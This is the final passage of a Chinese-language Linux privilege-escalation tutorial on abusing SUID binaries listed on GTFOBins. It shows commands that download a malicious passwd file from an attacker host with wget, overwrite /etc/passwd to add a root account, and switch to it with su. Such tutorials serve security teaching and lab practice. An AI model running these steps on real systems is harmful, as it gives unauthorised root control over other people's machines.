2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190626031-2121589961-ccf3ca2f6865c2f065ff8a233d6649d3.png" width="550" height="238" class="img_ev3q"></p>
<p>Perfect！文件已准备好发送回受害者。现在剩下要做的就是 cd 到受害者的 /etc 目录，然后使用 wget 下载 <strong>passwd</strong> 文件。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /etc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wget http://172.16.1.30/passwd -O passwd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190628058-180788036-02a9f19b6f3d6ce7900018547b992c5e.png" width="994" height="382" class="img_ev3q"></p>
<p>Awesome！我们的恶意 passwd 副本已经成功覆盖了原始副本。</p>
<p>现在我们可以通过 su 进入我们的新 root 用户并完全控制受害者。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">su r00t</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625892-1894980293-b8237f0fda3bcae42b3ca5594b85ebed.png" width="345" height="93" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="5最后的想法"><strong><div id="id5">5、最后的想法</div></strong><a href="#5最后的想法" class="hash-link" aria-label="5最后的想法的直接链接" title="5最后的想法的直接链接">​</a></h2>
<p>这些都是好东西，但就 GTFObins 上可找到的易受攻击二进制文件的数量而言，我们在这里只是触及了皮毛。</p>
<p>总之，我们还没完！如果您有兴趣了解我们如何利用自定义 SUID 二进制文件，请继续阅读第二部分。</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/web/docs/渗透/Linux 提权/Linux 提权-NFS 共享"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Linux 提权-NFS 共享</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_2"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Linux 提权-SUID_SGID_2</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#导航" class="table-of-contents__link toc-highlight">导航</a></li><li><a href="#0前言" class="table-of-contents__link toc-highlight"><strong><div>0、前言</div></strong></a></li><li><a href="#1了解特殊权限" class="table-of-contents__link toc-highlight"><strong><div>1、了解特殊权限</div></strong></a></li><li><a href="#2寻找-suidsgid-二进制文件---手动方法" class="table-of-contents__link toc-highlight"><strong><div>2、寻找 SUID/SGID 二进制文件 - 手动方法</div></strong></a></li><li><a href="#3寻找-suidsgid-二进制文件--自动工具" class="table-of-contents__link toc-highlight"><strong><div>3、寻找 SUID/SGID 二进制文件 – 自动工具</div></strong></a></li><li><a href="#4利用-suid-二进制文件--gtfobins" class="table-of-contents__link toc-highlight"><strong><div>4、利用 SUID 二进制文件 – GTFOBins</div></strong></a><ul><li><a href="#下面开始拼凑碎片然后获得-root" class="table-of-contents__link toc-highlight"><strong>下面开始拼凑碎片，然后获得 root</strong></a></li></ul></li><li><a href="#5最后的想法" class="table-of-contents__link toc-highlight"><strong><div>5、最后的想法</div></strong></a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://www.cnblogs.com/kqdssheng" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--light_NVdE" width="30" height="30"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--dark_xIcU" width="30" height="30"></a></div></div></div></footer></div>
</body>
</html>